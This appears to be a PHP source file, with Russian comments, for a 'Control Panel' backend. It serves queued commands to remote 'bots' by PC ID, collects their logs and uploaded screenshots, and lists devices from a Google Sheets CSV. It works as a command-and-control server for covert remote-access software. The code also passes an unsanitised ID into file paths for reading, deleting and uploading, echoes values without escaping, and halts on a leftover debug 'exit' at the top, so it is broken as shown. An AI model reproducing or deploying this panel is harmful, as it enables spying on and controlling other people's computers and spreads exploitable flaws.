<?php
var_dump($rows); exit;
// 1. НАСТРОЙКИ
// Укажи здесь ссылку на CSV (опубликованный в Google Sheets)
$csvUrl = "https://docs.google.com/spreadsheets/d/e/2PACX-1vTdx2B6KMZldMKf_mGRigmL0AqP0DtaNmaHeJhJQI31AJgd1hIgRMFk_Mv5DlDKm0AzI_mJF0Lfg7Ev/pub?output=csv" . "&t=" . time(); 

// 2. ОБРАБОТКА КОМАНД ДЛЯ БОТА (API)
if (isset($_GET['get_cmd'])) {
    $pc_id = $_GET['pc_id'];
    $cmdFile = "cmd_" . $pc_id . ".txt";
    
    if (file_exists($cmdFile)) {
        echo file_get_contents($cmdFile);
        unlink($cmdFile); // Удаляем команду после того, как бот её забрал
    } else {
        echo "none";
    }
    exit; // Важно: стопаем выполнение, чтобы не отдавать HTML
}

// 3. ПРИЕМ ОТВЕТОВ ОТ БОТА (Логи/Скриншоты)
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_POST['log'])) {
        file_put_contents("log_" . $_POST['pc_id'] . ".txt", $_POST['log']);
    }
    if (isset($_FILES['screen'])) {
        move_uploaded_file($_FILES['screen']['tmp_name'], "screen_" . $_POST['pc_id'] . ".jpg");
    }
    exit;
}

// 4. ПАРСИНГ ДАННЫХ ДЛЯ UI
$data = @file_get_contents($csvUrl);
$rows = $data ? array_map('str_getcsv', preg_split("/\r\n|\n|\r/", $data)) : [];
if (count($rows) > 0) array_shift($rows); // Убираем заголовок

$devices = []; $new_pcs = [];
foreach ($rows as $row) {
    if (count($row) < 4) continue;
    $ip = trim($row[1]);
    if (trim($row[3]) === "0") { $new_pcs[$ip] = true; } 
    else { $devices[$ip] = ['name' => $row[3], 'status' => $row[2]]; }
}
?>

<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <title>Control Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>body { background: #0f172a; color: white; }</style>
</head>
<body class="p-4">
    <div class="container-fluid">
        <h2 class="mb-4">Устройства</h2>
        <div class="row g-3">
            <?php foreach($new_pcs as $ip => $v): ?>
                <div class="col-md-3"><div class="card p-3 border-danger bg-dark">
                    <h5 class="text-danger">⚠️ Новый ПК</h5>
                    <small><?= $ip ?></small>
                    <form method="POST" action="update_name.php"> <input type="hidden" name="ip" value="<?= $ip ?>">
                        <input type="text" name="new_name" class="form-control mb-2" placeholder="Имя...">
                        <button type="submit" class="btn btn-success btn-sm">Сохранить</button>
                    </form>
                </div></div>
            <?php endforeach; ?>

            <?php foreach($devices as $ip => $d): ?>
                <div class="col-md-3"><div class="card p-3 bg-dark">
                    <h5><?= htmlspecialchars($d['name']) ?></h5>
                    <p class="text-success"><?= $d['status'] ?></p>
                </div></div>
            <?php endforeach; ?>
        </div>
    </div>
</body>
</html>
